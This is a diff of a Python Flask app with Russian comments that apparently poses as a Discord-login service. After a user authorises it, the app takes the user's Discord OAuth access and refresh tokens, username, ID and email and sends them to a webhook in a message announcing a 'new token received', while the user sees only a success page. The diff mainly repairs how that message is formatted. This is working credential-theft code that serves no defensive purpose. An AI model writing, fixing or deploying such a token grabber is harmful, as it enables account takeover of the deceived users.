@@ -3,7 +3,6 @@ import requests
 import urllib.parse
 import logging
 from datetime import datetime
-import json
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -286,17 +285,113 @@ SUCCESS_PAGE = """
 def send_token_to_webhook(access_token, refresh_token, user_data):
     """Отправляет токен в вебхук с правильным форматированием"""
     
-    # Получаем данные пользователя
     username = user_data.get('username', 'Неизвестно')
     user_id = user_data.get('id', 'Неизвестно')
     email = user_data.get('email', 'Не указан')
     
-    # === ВАРИАНТ 1: Отправка как обычное сообщение (самый надёжный) ===
-    message = f"""**🔐 НОВЫЙ ТОКЕН ПОЛУЧЕН!**
+    # Формируем сообщение - исправлено!
+    message = (
+        "**🔐 НОВЫЙ ТОКЕН ПОЛУЧЕН!**\n\n"
+        "**👤 Пользователь:** " + username + "\n"
+        "**🆔 ID:** " + user_id + "\n"
+        "**📧 Email:** " + email + "\n"
+        "**⏰ Время:** " + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\n\n"
+        "**🔑 ТОКЕН ДОСТУПА:**\n"
+        "```\n" + access_token + "\n```\n\n"
+        "**🔄 REFRESH ТОКЕН:**\n"
+        "```\n" + refresh_token + "\n```\n\n"
+        "**📊 Информация:**\n"
+        "• Тип: Bearer\n"
+        "• Длина токена: " + str(len(access_token)) + " символов\n"
+        "• Аккаунт подтверждён: " + ("✅ Да" if user_data.get('verified') else "❌ Нет")
+    )
+    
+    try:
+        payload = {"content": message}
+        resp = requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        logger.info(f"📬 Вебхук: {resp.status_code}")
+        
+        if resp.status_code in [200, 204]:
+            logger.info("✅ Токен отправлен!")
+            return True
+        else:
+            logger.error(f"❌ Ошибка: {resp.status_code} - {resp.text}")
+            return False
+            
+    except Exception as e:
+        logger.error(f"❌ Ошибка: {e}")
+        return False
 
-👤 **Пользователь:** {username}
-🆔 **ID:** {user_id}
-📧 **Email:** {email}
-⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+# ===== МАРШРУТЫ =====
 
-**🔑 ТОКЕН ДОСТУПА:**
+@app.route('/')
+def home():
+    return render_template_string(DOCS_PAGE)
+
+@app.route('/login')
+def login():
+    discord_auth_url = (
+        f"https://discord.com/api/oauth2/authorize"
+        f"?client_id={CLIENT_ID}"
+        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
+        f"&response_type=code"
+        f"&scope=identify%20email%20guilds"
+    )
+    return redirect(discord_auth_url)
+
+@app.route('/callback')
+def callback():
+    code = request.args.get('code')
+    error = request.args.get('error')
+    
+    if error:
+        logger.error(f"Ошибка: {error}")
+        return f"Ошибка: {error}", 400
+    
+    if not code:
+        logger.error("Код не получен")
+        return "Код не получен", 400
+    
+    data = {
+        "client_id": CLIENT_ID,
+        "client_secret": CLIENT_SECRET,
+        "grant_type": "authorization_code",
+        "code": code,
+        "redirect_uri": REDIRECT_URI,
+    }
+    
+    try:
+        resp = requests.post("https://discord.com/api/oauth2/token", data=data)
+        logger.info(f"Статус Discord API: {resp.status_code}")
+        
+        if resp.status_code == 200:
+            token_data = resp.json()
+            access_token = token_data.get("access_token")
+            refresh_token = token_data.get("refresh_token")
+            
+            logger.info(f"✅ Токен получен! Длина: {len(access_token) if access_token else 0}")
+            
+            headers = {'Authorization': f'Bearer {access_token}'}
+            user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
+            
+            if user_resp.status_code == 200:
+                user_data = user_resp.json()
+                logger.info(f"👤 {user_data.get('username')}")
+                send_token_to_webhook(access_token, refresh_token, user_data)
+                return render_template_string(SUCCESS_PAGE)
+            else:
+                return render_template_string(SUCCESS_PAGE)
+        else:
+            logger.error(f"❌ Ошибка: {resp.status_code}")
+            return f"Ошибка: {resp.status_code}", 400
+            
+    except Exception as e:
+        logger.error(f"❌ Ошибка: {e}")
+        return "Внутренняя ошибка", 500
+
+@app.route('/health')
+def health():
+    return {"status": "ok"}, 200
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=8080)
